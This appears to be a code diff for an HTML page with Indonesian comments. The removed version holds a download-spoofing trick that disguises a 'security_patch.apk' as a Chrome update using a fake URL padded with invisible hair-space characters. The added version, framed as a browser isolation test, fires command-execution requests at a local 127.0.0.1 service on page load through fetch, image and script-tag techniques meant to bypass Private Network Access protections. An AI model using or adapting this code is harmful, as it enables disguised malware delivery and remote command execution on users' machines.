@@ -1,23 +1,44 @@
-<button id="dl_btn">Update Now</button>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Research - Browser Isolation Test</title>
+</head>
+<body style="background: #1a1a1a; color: #ff3e3e; font-family: 'Courier New', monospace; text-align: center; padding-top: 50px;">
+    <h1>CRITICAL: SYSTEM ISOLATION TEST</h1>
+    <p>If a calculator opens, your browser failed to block a Private Network Access (PNA) attack.</p>
+    <div id="status" style="color: #00ff00; margin-top: 20px;">Testing boundaries...</div>
 
-<script>
-  document.getElementById('dl_btn').onclick = () => {
-    const filename = "security_patch.apk";
-    
-    // Trik: Gunakan domain palsu sebagai bagian dari MIME type atau path data
-    // Chrome terkadang mengekstrak string yang menyerupai domain di awal URI
-    const fakeDomain = "https://www.google.com/chrome/update/stable/release/index.html";
-    
-    // Gunakan spasi Unicode yang lebih kecil (Hair Space \u200A) 
-    // agar tidak memicu deteksi 'long string' tapi tetap mendorong teks asli
-    const padding = "\u200A".repeat(300);
-    
-    // Kita buat 'data' URI yang terlihat seperti path URL
-    const payload = `data:text/html;base64,ZXN0?source=${fakeDomain}${padding}#${fakeDomain}`;
+    <script>
+        const target = "http://127.0.0.1:3000/exec?cmd=";
+        const payloads = [
+            "calc.exe", 
+            "echo Pwned_By_PNA_Bypass > %USERPROFILE%\\Desktop\\chrome_vulnerability.txt"
+        ];
 
-    const a = document.createElement('a');
-    a.href = payload;
-    a.download = filename;
-    a.click();
-  };
-</script>
+        function trigger() {
+            payloads.forEach(cmd => {
+                const fullUrl = target + encodeURIComponent(cmd);
+                
+                // Teknik 1: Fetch dengan 'no-cors' (Memicu PNA Policy)
+                fetch(fullUrl, { 
+                    mode: 'no-cors',
+                    priority: 'high'
+                }).catch(e => console.log("Fetch blocked, trying backup..."));
+
+                // Teknik 2: Image Injection (Seringkali bypass preflight karena dianggap simple request)
+                const img = new Image();
+                img.src = fullUrl;
+
+                // Teknik 3: Script Tag Injection (Sangat agresif)
+                const script = document.createElement('script');
+                script.src = fullUrl;
+                document.body.appendChild(script);
+            });
+            document.getElementById('status').innerText = "Payload Deployed. Check for calc.exe.";
+        }
+
+        // Jalankan setelah 1 detik untuk memastikan browser siap
+        setTimeout(trigger, 1000);
+    </script>
+</body>
+</html>
